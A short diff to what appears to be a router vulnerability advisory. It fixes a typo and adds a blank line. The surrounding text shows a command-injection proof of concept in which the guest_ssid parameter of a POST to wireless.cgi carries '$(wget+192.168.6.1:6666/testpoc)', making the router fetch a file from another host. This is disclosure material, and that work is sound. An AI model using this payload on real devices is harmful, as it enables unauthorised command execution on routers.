@@ -34,7 +34,7 @@ Finally,the value of `guestssid` will be inserted into `v8` and `v8` will be exe
 
 ## Proof of Concept (PoC)
 
-We set `guest_ssid` as **$(wget+192.168.6.1:6666/testpoc)** , and the router will excute it,such as:
+We set `guest_ssid` as **$(wget+192.168.6.1:6666/testpoc)** , and the router will execute it,such as:
 
 ```http
 POST /cgi-bin/wireless.cgi HTTP/1.1
@@ -53,4 +53,5 @@ page=GuestWifi&guestEn=1&Guest_ssid=$(wget+192.168.6.1:6666/testpoc)
 ```
 
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
